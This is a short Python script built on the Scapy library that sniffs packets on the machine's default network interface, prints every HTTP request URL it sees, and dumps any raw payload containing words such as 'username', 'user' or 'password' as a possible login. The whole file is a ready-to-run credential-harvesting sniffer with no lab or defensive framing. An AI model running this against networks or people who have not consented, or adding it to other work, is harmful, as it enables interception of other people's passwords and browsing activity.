from scapy.all import *
from scapy.layers import http


class Sniffer:

    def sniffer(self, interface):
        sniff(iface=interface, store=False, prn=self.process_packet_sniffed)

    def get_interface(self):
        if conf.route.route("0.0.0.0")[2] == "0.0.0.0":
            print("Connect to the internet")
        return conf.iface

    def get_url(self, pkt):
        return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

    def get_login_info(self, pkt):
        if pkt.haslayer(Raw):
            load = pkt[Raw].load
            keys = ["username", "uname", "user", "userid", "password", "pass"]
            for keys in keys:
                if keys in str(load):
                    return load

    def process_packet_sniffed(self, pkt):
        if pkt.haslayer(http.HTTPRequest):
            url = self.get_url(pkt)
            if url:
                print("\n[+]HTTP REQUEST URL >> " + str(url) + "\n")

            login_info = self.get_login_info(pkt)
            if login_info:
                print("\n[+]POSSIBLE USER ID/PASSWORD >> " + str(login_info) + "\n")

    def execute_pkt_sniffer(self):
        interface = self.get_interface()
        self.sniffer(interface)


obj = Sniffer()
obj.execute_pkt_sniffer()
